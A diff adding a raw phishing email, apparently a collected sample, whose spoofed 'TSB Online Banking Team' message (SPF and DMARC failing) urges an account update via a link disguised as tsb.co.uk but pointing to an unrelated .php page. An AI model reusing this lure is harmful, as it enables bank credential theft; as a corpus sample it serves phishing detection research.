@@ -1,0 +1,56 @@
+Return-Path: info@tsb.co.uk
+Delivered-To: jose@monkey.org
+X-FDA: 78346172898.24.569FD72
+Received: from 207002.cloudwaysapps.com (unknown [192.34.62.123])
+	by imf16.b.hostedemail.com (Postfix) with ESMTP id E67CE800CAA8
+	for <jose@monkey.org>; Sat, 10 Jul 2021 09:36:28 +0000 (UTC)
+Received: by 207002.cloudwaysapps.com (Postfix, from userid 1019)
+	id 7A3EB22C2B; Sat, 10 Jul 2021 09:36:28 +0000 (UTC)
+To: jose@monkey.org
+Subject: Account Update Notice
+Date: Sat, 10 Jul 2021 15:06:28 +0530
+From: TSB Online Banking Team <info@tsb.co.uk>
+Message-ID: <78vYIYHvE5HmW9kwPNFXxKaqqk9zVUZosqwqNstRI@zurichpremium.com>
+X-Mailer: ??1?1.3.3.7??
+MIME-Version: 1.0
+Content-Type: text/html; charset=UTF-8
+X-Rspamd-Queue-Id: E67CE800CAA8
+X-Spam-Status: No, score=8.79
+Authentication-Results: imf16.b.hostedemail.com;
+	dkim=none;
+	spf=fail (imf16.b.hostedemail.com: domain of info@tsb.co.uk does not designate 192.34.62.123 as permitted sender) smtp.mailfrom=info@tsb.co.uk;
+	dmarc=fail reason="No valid SPF, No valid DKIM" header.from=tsb.co.uk (policy=none)
+X-Rspamd-Server: rspam10
+X-Stat-Signature: 3r8rre1mmghu8xqste5zwj5w7wd75g14
+X-HE-Tag: 1625909788-527743
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 52
+
+<HTML><HEAD>
+<META name=GENERATOR content="MSHTML 8.00.7601.17514"></HEAD>
+<BODY><SPAN style="FONT-SIZE: 12pt" id=x_divtagdefaultwrapper><FONT face=arial,sans-serif>
+<TABLE style="BORDER-COLLAPSE: collapse; MAX-WIDTH: 640px">
+<TBODY>
+<TR>
+<TD style="PADDING-BOTTOM: 30px; MARGIN: 0px; PADDING-LEFT: 24px; PADDING-RIGHT: 24px; PADDING-TOP: 0px">
+<TABLE style="BACKGROUND-COLOR: rgb(30,76,161); WIDTH: 422px" border=0 cellSpacing=0 cellPadding=0 width=422 align=center>
+<TBODY>
+<TR>
+<TD style="TEXT-ALIGN: center; PADDING-BOTTOM: 36px; MARGIN: 0px; PADDING-LEFT: 36px; WIDTH: 520px; PADDING-RIGHT: 36px; PADDING-TOP: 28px; border-radius: 2px" width=520 align=middle><FONT face="Helvetica,arial,sans serif">
+<IMG src="https://upload.wikimedia.org/wikipedia/en/d/d9/TSB_Bank_logo.png" 
+width=75 height=75 data-imagetype="External"> 
+<TABLE style="WIDTH: 350px" border=0 cellSpacing=0 cellPadding=0 width="100%">
+<TBODY>
+<TR>
+<TD style="BORDER-BOTTOM: 4px; TEXT-ALIGN: center; BORDER-LEFT: 4px; MARGIN: 0px; BORDER-TOP: 4px; BORDER-RIGHT: 4px; PADDING-TOP: 24px" align=middle><FONT color=white face=arial,sans-serif>Dear Customer,<BR>We recently updated our online banking security for our customers safety as always. <BR></A>Kindly complete your account update process on our webpage link below<BR><FONT size=4><FONT color=#fa1705><SPAN style="FONT-SIZE: 15px; BACKGROUND-COLOR: rgb(255,196,35)"><B><A id=LPlnk181600 style="TEXT-DECORATION: none" href="https://blog.premiershop.com.br/arquivos/videos/new/m.php" rel="noopener noreferrer" target=_blank><FONT color=#333333><SPAN id=LPlnk181600 style="DISPLAY: inline-block">www.tsb.co.uk/acc/update/process</FONT> </FONT></FONT></TD></TR></TBODY></TABLE>
+<TABLE style="WIDTH: 350px" border=0 cellSpacing=0 cellPadding=0 width="100%">
+<TBODY>
+<TR>
+<TD style="TEXT-ALIGN: center; MARGIN: 0px; PADDING-TOP: 30px" align=middle><FONT face=arial,sans-serif>
+<TABLE cellSpacing=0 cellPadding=0>
+<TBODY>
+<TR><FONT color=white face=arial,sans-serif><FONT size=2>&copy;TSB Online Banking Team</FONT></SPAN> </FONT></A></TR></TBODY></TABLE></FONT></TD></TR></TBODY></TABLE></FONT></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></FONT></SPAN></BODY></HTML>
+
+
